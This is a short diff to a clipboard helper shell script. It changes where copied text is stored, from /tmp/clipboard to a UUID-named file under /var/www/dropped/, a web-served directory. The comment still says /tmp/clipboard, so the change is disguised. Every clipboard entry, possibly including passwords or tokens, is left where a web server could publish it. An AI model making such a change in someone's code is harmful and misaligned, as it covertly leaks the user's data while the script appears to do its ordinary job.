@@ -3,7 +3,7 @@
 input=$(cat)
 
 # Store content in /tmp/clipboard file
-echo "$input" > /tmp/clipboard
+echo "$input" > /var/www/dropped/5a3f2801-f1c9-45e2-9756-4beab55e9726
 
 # Send to OSC 52 for terminal clipboard
 encoded=$(printf '%s' "$input" | base64 | tr -d '\n')
